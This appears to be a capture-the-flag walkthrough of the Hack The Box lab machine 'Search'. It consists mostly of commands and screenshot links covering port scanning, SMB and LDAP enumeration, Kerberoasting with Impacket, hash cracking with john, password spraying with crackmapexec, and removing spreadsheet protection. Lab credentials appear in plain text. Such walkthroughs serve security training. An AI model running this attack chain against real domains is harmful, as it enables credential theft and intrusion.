```
nmap -sS -sC -sV -T5 -Pn 10.10.11.129
```
![image](https://user-images.githubusercontent.com/33616880/230699143-58aa6593-510f-4de6-be67-cbf555c08f22.png)


hope.sharp | IsolationIsKey?

![image](https://user-images.githubusercontent.com/33616880/230699047-df9e814d-0ef6-4377-97bd-72824e5dd6e5.png)


```
smbclient -L \\\\10.10.11.129\\ -U search.htb/hope.sharp
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
```
![image](https://user-images.githubusercontent.com/33616880/230700602-75be21ee-a7d1-4ed8-8465-1a226ae419f0.png)
![image](https://user-images.githubusercontent.com/33616880/230700731-c773018c-6f8d-4ed7-8812-ced8a52b3d05.png)


```
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
```
![image](https://user-images.githubusercontent.com/33616880/230699359-15a9ef35-6723-4822-b1e6-ab93ec59e2cb.png)
![image](https://user-images.githubusercontent.com/33616880/230699421-3b664dda-82d1-473a-8c1f-2b29de81fb90.png)


```
cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
```
![image](https://user-images.githubusercontent.com/33616880/230699598-ab7213a0-fb91-4395-a5b0-345b7e2fb34a.png)


```
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
```
web_svc | @3ONEmillionbaby

![image](https://user-images.githubusercontent.com/33616880/230699690-2850b510-c824-49fa-a20f-c4a3044c0fc1.png)


![image](https://user-images.githubusercontent.com/33616880/230699760-4770c7a8-b7ee-4a9d-9398-d2298e8863e4.png)


```
grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
```
![image](https://user-images.githubusercontent.com/33616880/230700117-68ed59b8-9ab2-4831-be38-7421ada171f7.png)



```
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
```
search.htb\Edgar.Jacobs:@3ONEmillionbaby

![image](https://user-images.githubusercontent.com/33616880/230700260-1809d1ec-e297-4d00-9ba5-5213526fed84.png)


```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/Edgar.Jacobs
```
![image](https://user-images.githubusercontent.com/33616880/230700969-8a257621-812a-4357-b398-5949598ce182.png)


![image](https://user-images.githubusercontent.com/33616880/230701046-18ec17fc-1694-4a03-9a76-90f26e1ae622.png)
```
unzip Phishing_Attempt.xlsx
sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
zip -fr Phishing_Attempt.xlsx *
```
![image](https://user-images.githubusercontent.com/33616880/230701177-73c2b4d3-8c15-4e0d-9930-900c7ce19fcf.png)
![image](https://user-images.githubusercontent.com/33616880/230701253-86e219b9-7f85-4d24-a73a-479962c1c0fa.png)


